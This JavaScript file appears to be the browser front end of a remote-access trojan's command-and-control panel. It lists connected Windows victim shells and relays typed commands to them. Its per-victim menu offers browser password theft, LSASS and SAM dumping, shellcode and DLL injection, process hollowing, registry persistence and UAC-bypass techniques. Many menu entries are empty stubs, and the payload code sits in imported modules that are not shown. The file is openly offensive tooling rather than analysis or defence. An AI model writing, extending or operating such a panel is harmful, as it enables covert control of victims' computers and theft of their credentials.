
import {
    PersistenceOption, 
    InjectOption, 
    PasswordOption, 
    SendInjectShellCodeLocal,
    UploadProcessToInject,
    HollowingOptionHandler,
    sendMsgToFlsk
} from './OptionSettings.js';
  

let chatVisible = false;
let selectedClient = null;



async function displayClients() {
  const response = await fetch('/listShellConnections', {
    method: 'GET'
  });
  const clients = await response.json();
  const clientsContainer = document.getElementById('clients-container');

  for (let id of clients) {
    console.log(`rec id: ${id}`);
    const clientDiv = document.createElement('div');
    clientDiv.className = 'client';


    const optionBar = document.createElement('i');
    optionBar.className = "fa-solid fa-ellipsis-vertical"
    clientDiv.appendChild(optionBar)
    optionBar.addEventListener("click",() => DisplaySettings(clientDiv,id))

    const clientIcon = document.createElement('i');
    clientIcon.className = 'fa-brands fa-windows';
    clientIcon.style.color = '#49da3e';
    clientIcon.addEventListener('click', () => onClientClick(id, clientIcon));
    clientDiv.appendChild(clientIcon);

    const clientIp = document.createElement('div');
    clientIp.className = 'client-ip';
    clientIp.textContent = id.split(':')[0];
    clientDiv.appendChild(clientIp);

    clientsContainer.appendChild(clientDiv);
  }

 
  function onClientClick(id, clientIcon) {
    const icons = clientsContainer.querySelectorAll('.client img');
    icons.forEach(icon => {
      icon.classList.remove('selected');
    });

    if (selectedClient !== id) {
      clientIcon.classList.add('selected');
      handleChat(id);
      chatVisible = true;
    } else {
      toggleChatVisibility();
    }

    selectedClient = chatVisible ? id : null;
  }
}


function toggleChatVisibility() {
  const containerChat = document.getElementById('ChatContainer');
  chatVisible = !chatVisible;
  containerChat.style.display = chatVisible ? 'block' : 'none';
}

function handleChat(id) {
  const buttonSend = document.getElementById('sentButton');
  const containerChat = document.getElementById('ChatContainer');
  containerChat.style.display = 'block'
  const chatBody = document.querySelector('.chat-body');
  const txtInput = document.getElementById('txtInput');
  const chatHeader = document.querySelector('.chat-header');
  chatHeader.innerHTML = "";
  var navItems = [
    {id: 'FeaturesnavOption', action: null, text:"Features"},
    {id: 'RecordnavOption', action: null, icon:"fas fa-record-vinyl"},
  ];
  
  const parentNavDiv = document.createElement('div');
  parentNavDiv.id = "parentNavDivonheader";
  var navbar = document.createElement('nav');
  navbar.className = 'navbar navbar-expand-lg navbar-light bg-light'; 
  navbar.id = "NavBarOnHeaderChat";
  
  var collapseDiv = document.createElement('div');
  collapseDiv.className = 'collapse navbar-collapse';  
  
  var list = document.createElement('ul');
  list.className = 'navbar-nav mr-auto'; 
  for (var i = 0; i < navItems.length; i++) {
    var listItem = document.createElement('li');
    listItem.className = 'nav-item';
    

    var link = document.createElement('a');
    link.className = 'nav-link';
    link.id = navItems[i].id; 
    
    
    if (navItems[i].icon){
      var icon = document.createElement('i');
      icon.className = navItems[i].icon;
      link.appendChild(icon);
    }
    if(navItems[i].text){ 
      link.appendChild(document.createTextNode(" " + navItems[i].text));
    }

    listItem.appendChild(link); 

    if(navItems[i].action){
      listItem.addEventListener("click",navItems[i].action);
    }
    
    list.appendChild(listItem);
  }  
  collapseDiv.appendChild(list);
  navbar.appendChild(collapseDiv);
  parentNavDiv.appendChild(navbar);
  chatHeader.appendChild(parentNavDiv); 

  buttonSend.addEventListener("click", () => {
      renderUserMessage(); 
  });




  const renderUserMessage = () => {  
    console.log("message processing....");
    const userInput = txtInput.value
    if(!userInput){
      console.log("Input is null....");
      return;
    }
    renderMessageEle(userInput, "user");
    txtInput.value = "";
    renderChatbotResponse(userInput);
  };

  const renderChatbotResponse = async (userInput) => {
    try {
      const response = await fetch("/send_message", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: userInput}, id: id})
      });

      const data = await response.json();
      const chatbotResponse = data.message;
      renderMessageEle(chatbotResponse);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const renderMessageEle = (txt, type) => {
    let className = "user-message";
    if (type !== "user") {
      className = "chatbot-message";
    }
    const messageEle = document.createElement("pre");
    const txtNode = document.createTextNode(txt);
    messageEle.classList.add(className);
    messageEle.append(txtNode);
    chatBody.append(messageEle);
  };
}




function createOptionElement(option, issub=false) {
  const li = document.createElement('li');
  li.style = "padding: 3px;";
  li.id = "liOptionSettingElement";
  if (issub){
    li.className = "HaveSubAndper";
  }
  const optionElement = document.createElement('a');
  optionElement.href = "#";
  optionElement.textContent = option.name;
  optionElement.style = "padding: 5px 5px 5px 5px;";
  if (option.action){
    optionElement.addEventListener('click', option.action);
  }
  li.appendChild(optionElement);

  if (option.subOptions && option.subOptions.length > 0) {
    const subUl = document.createElement('ul');
    subUl.style.display = "none";
    subUl.id = 'SubOptionClientSetting';

    for (let j = 0; j < option.subOptions.length; j++) {
      const subOptionElement = createOptionElement(option.subOptions[j],true); 
      subUl.appendChild(subOptionElement);
    }

    const submenuWrapper = document.createElement('div');
    submenuWrapper.className = "submenu-wrapper";
    submenuWrapper.appendChild(subUl);
    li.appendChild(submenuWrapper);

    const arrowElement = document.createElement('span');
    arrowElement.textContent = '▶';
    arrowElement.style.float = 'right';
    optionElement.addEventListener('click', function(e) {
      toggleAllOptionSettings(li);
      e.stopPropagation();
      if (subUl.style.display === 'none') {
        subUl.style.display = 'block';
      } else {
        subUl.style.display = 'none';
      }
    });
    optionElement.appendChild(arrowElement);
  }

  return li;
}


function DisplaySettings(clientDiv, id) {
  let menu = document.getElementById('settings-menu');
  if (menu){
    menu.remove();
  }
  const PersistenceOp = new PersistenceOption(id);
  let hollowinghandler = new HollowingOptionHandler(id);
  const options = [
    { 
      name: "Passwords", 
      action: null,
      subOptions: [
        { 
          name: "Edge", 
          action: (e) => PasswordOption(e, id, "edge")
        },
        { 
          name: "Chrome", 
          action: (e) => PasswordOption(e, id, "chrome")
        },
        {
          name: "Dump Lsass",
          action: null
        },
        {
          name: "Dump SAM",
          action: null
        },
        {
          name: "Wifi Passwords",
          action: null 
        }
      ]
    },
    {
      name: "Injection", 
      action: null,
      subOptions:[
        { 
          name: "Inject Process", 
          action: (e) => InjectOption(e, id, "SHELLCODE") 
        },
        {
          name: "Process Hollowing",
          action: () => hollowinghandler.initialize()
        },
        { 
          name: "Run shell code", 
          action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) 
        },
        {
          name: "Dll Injection",
          action: (e) => InjectOption(e, id, "DLL")
        }
      ]
    },
    {
      name: "New Console shell",
      action: () => sendMsgToFlsk("0x2737538258278", id)
    },
    { 
      name: "Persistence", 
      action: null,
      subOptions: [
        { 
          name: "Registry", 
          action: null,
          subOptions: [
            {
              name: "USERINIT",
              action: PersistenceOp.action
            },
            {
              name: "Run (Local User)",
              action: PersistenceOp.action
            },
            {
              name: "Run (Local Machine)",
              action: PersistenceOp.action
            },
            {
              name: "Extention hijack (txt)",
              action: PersistenceOp.action
            }
          ]
        },
        { 
          name: "Scheduled Task", 
          action: null
        }
      ]
    },
    {
      name: "Privilege escalation", 
      action: null,
      subOptions: [
        {
          name: "Fileless (uac)",
          action: null,
          subOptions:[
            { 
              name: "Fodhelper (uac)", 
              action: null
            },
            { 
              name: "computerDefault (uac)", 
              action: null
            },
            { 
              name: "Sdclt (uac)", 
              action: null
            },
          ]
        },
        {
          name: "Get System",
          action: null,
          subOptions:[
            {
              name: "Spawn parent",
              action: null
            },
            {
              name: "Schduald Task",
              action: null 
            },
          ]
        }
      ]
    }
  ];

 
    menu = document.createElement('div');
    menu.id = "settings-menu";
    const ul = document.createElement('ul');
    ul.style = "margin-bottom: 0px;";

    for (let i = 0; i < options.length; i++) {
      const optionElement = createOptionElement(options[i]);
      ul.appendChild(optionElement);
    }  
    menu.appendChild(ul);
    clientDiv.appendChild(menu);
}


function toggleAllOptionSettings(exclude) {
  let elements;
  if(exclude.classList.contains("HaveSubAndper")){
    elements = exclude.parentElement.closest('li').querySelectorAll("#liOptionSettingElement")
  }
  else {
    elements = document.querySelectorAll("#liOptionSettingElement");
  }
  elements.forEach(element => {
      if (element != exclude) {
          let subElements = element.querySelectorAll("#SubOptionClientSetting");
          subElements.forEach(subElement => subElement.style.display = 'none');
      }
  });
}



displayClients()